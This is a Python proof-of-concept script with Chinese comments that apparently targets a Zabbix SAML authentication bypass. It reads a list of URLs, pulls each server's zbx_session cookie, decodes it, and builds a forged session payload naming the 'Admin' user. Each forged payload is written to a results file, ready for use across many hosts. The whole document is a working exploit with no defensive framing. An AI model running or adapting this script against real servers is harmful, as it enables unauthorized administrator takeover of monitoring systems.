import requests
import re, base64, urllib.parse, json

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

OUTPUT_FILE = 'bug.txt'
URLS_FILE = 'urls.txt'

def runPoc(url):
    try:
        response = requests.get(url, verify=False, timeout=5)
        response.raise_for_status()  # 检查是否有HTTP错误
        cookie = response.headers.get("Set-Cookie")
        
        if cookie is not None:
            sessionReg = re.compile("zbx_session=(.*?);")
            session = re.findall(sessionReg, cookie)
            if session:
                session = session[0]
                base64_decode = base64.b64decode(urllib.parse.unquote(session, encoding="utf-8"))
                session_json = json.loads(base64_decode)
                payload = '{"saml_data":{"username_attribute":"Admin"},"sessionid":"%s","sign":"%s"}' % (session_json["sessionid"], session_json["sign"])
                payload_encode = urllib.parse.quote(base64.b64encode(payload.encode()))

                with open(OUTPUT_FILE, 'a') as bug_file:
                    bug_file.write(f"IP: {response.url}\n")
                    bug_file.write(f"Payload: {payload_encode}\n\n")
                    bug_file.write("="*30 + "\n")
        else:
            with open(OUTPUT_FILE, 'a') as bug_file:
                bug_file.write(f"[-] {url} 未返回 Set-Cookie 头部\n")
                bug_file.write("="*30 + "\n")

    except requests.exceptions.RequestException as e:
        with open(OUTPUT_FILE, 'a') as bug_file:
            bug_file.write(f"[-] {url} 连接失败: {e}\n")
            bug_file.write("="*30 + "\n")

if __name__ == '__main__':
    try:
        with open(URLS_FILE, 'r') as file:
            urls = file.readlines()
            for url in urls:
                url = url.strip()
                print(f"处理URL: {url}")
                runPoc(url)
    except FileNotFoundError:
        print(f"{URLS_FILE} 文件未找到")
